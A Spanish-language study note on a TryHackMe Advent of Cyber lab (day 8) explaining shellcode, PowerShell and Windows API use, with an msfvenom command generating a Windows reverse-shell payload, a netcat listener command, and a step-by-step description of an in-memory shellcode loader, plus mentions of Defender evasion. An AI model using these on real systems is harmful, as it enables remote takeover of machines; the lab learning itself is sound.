---
{"dg-publish":true,"permalink":"/Ciberseguridad/Prácticas/TryHackMe/Advent of Cyber día 8/"}
---

[[Ciberseguridad/Prácticas/TryHackMe/Advent of Cyber día 7\|Advent of Cyber día 7]]

Objetivos:
- Fundamentos de shellcode
- Generar shellcodes para hacer reverse shells
- Ejecutar shellcode con powershell
Herramientas:
- PowerShell
- Programación
- Msfvenom

---

# Shellcode
Lo primero es entender algunos conceptos, ya que shellcode es un concepto un poco más avanzado.

Shellcode es un trozo de código usado por actores maliciosos durante exploits, como lo ataques de buffer overflow donde se inyectan comandos a un sistema vulnerable, lo que lleva a la ejecución arbitraria de comandos o darle el control de una máquina. Usualmente se escribe en Assembly y se entrega a través de diversas técnicas según la vulnerabilidad.

Powershell es un lenguaje de scripting y CLI en Windows para automatizar y manejar configuraciones. Le permite a un usuario interactuar con los componentes del sistema y es ampliamente usado por administradores. Sin embargo se suele usar por atacantes como una herramienta post-explotación porque tiene acceso profundo a los recursos del sistema y puede correr scripts directamente en memoria, evadiendo algunos mecanismos de detección.

Windows defender es una utilidad de seguridad de Windows que previene el lanzamiento de scripts maliciosos escaneando el código mientras corre. Las formas de evadirlo comunes incluyen la ofuscación de scripts y la inyección reflectiva, donde el código se carga en memoria.

Windows API le permite a los programas interactuar con el sistema operativo, dándoles acceso a recursos como la memoria y las redes. Es el puente entre la aplicación y el SO para manejar la memoria. Algunas funciones comunes que usan los atacantes son `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`.

Acceder a WAPIa través de la reflección de powershell es una técnica avanzada que usa interacción dinámica. Permite al atacante llamar funciones de WAPI diréctamente cuando se ejecutan, esto permite manipular procesos de bajo nivel.

Reverse Shell es un tipo de conexión en la que el objetivo inicia la conexión hacia tu máquina.

---

# msfvenom

Para crear el reverse shell, utilizaremos una herramienta llamada `msfvenom`.
Ejecutamos el siguiente comando en la termina:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPLOCAL LPORT=1111 -f powershell`
![](https://i.imgur.com/xDV3Er6.png)
- `-p windows/x64/shell_reverse_tcp`:
	- `-p` especifica que queremos un reverse shell para una máquina windows
- `LHOST=IPLOCAL`:
	- Le indica a qué IP se debe conectar de vuelta
- `LPORT=1111`:
	- El puerto que estará escuchando en tu máquina para el reverse shell. Puede ser cualquiera pero el "escucha" (listener) debe ser el mismo.
- `-f powershell`:
	- formato de salida.
- `hexadecimal`
	- la instrucción

Ahora para que esto funcione simplemente simularemos que logramos acceder a una máquina y vamos a ejecutar el código.
Se nos provee de un código en C# porque siendo sincero, esto es un poco complejo para un novato como yo.

---

# Shellcode

```C#
Aquí iba el código provisto por TryHackMe pero windows defender no me deja hacerlo
```
![](https://i.imgur.com/dn16GCX.png)

A grandes rasgos el código hacía lo siguiente:
- Define clases a través del atributo `DllImport` para cargar funciones específicas del kernel32
	- `VirtualAlloc`: atribuye memoria en el espacio del proceso, básicamente reserva espacio
	- `CreateThread`: crea un nuevo hilo en el proceso. Ejecutará el shellcode de la memoria
	- `WaitForsingleObject`: pausa la ejecución hasta que un hilo específico termine su tarea, de esta forma aseguramos su ejecución.
- Se agregan estas clases a powershell usando `Add-Type`.

- Luego, lo asigna en una variable, un byte array. Aquí reemplazamos con el hexadecimal que obtuvimos de msfvenom.
- `VirtualAlloc` asigna un bloque de memoria donde se va a guardar el shellcode:
	- `0` para la dirección en memoria, osea que windows decide dónde será
	- `$size`: para el tamaño, determinado por el largo del shellcode
	- `0x3000`: el tipo de asignación, le dice a windows que reserve y guarde en memoria
	- `0x40`: para protección de memoria, la memoria es de lectura y ejecutable.
- `Marshal.Copy` copia el shellcode del array a la memoria.
- Luego de que se guardó en memoria, se llama `CreateThread`.

Ahora, en nuestro kali ejecutamos el comando `nc -nvlp 1111` para crear un puerto de escucha y esperar una conexión.

En la máquina víctima, corremos todo el código C# que mencionamos y en nuestra máquina de ataque aparece el siguiente mensaje
![](https://i.imgur.com/LgcpoJ5.png)

---

# Bandera

Para obtenerla, debemos realizar el mismo proceso pero conectarnos al puerto 4444, por lo tanto ejecutamos un nuevo msfvenom pero cambiando el puerto, ejecutamos el reverse shell, esperamos un rato y la bandera aparecerá.

Hemos completado el día 8
![](https://i.imgur.com/QCuve3R.png)

Ahora toca el día [[Ciberseguridad/Prácticas/TryHackMe/Advent of Cyber día 9\|Advent of Cyber día 9]].
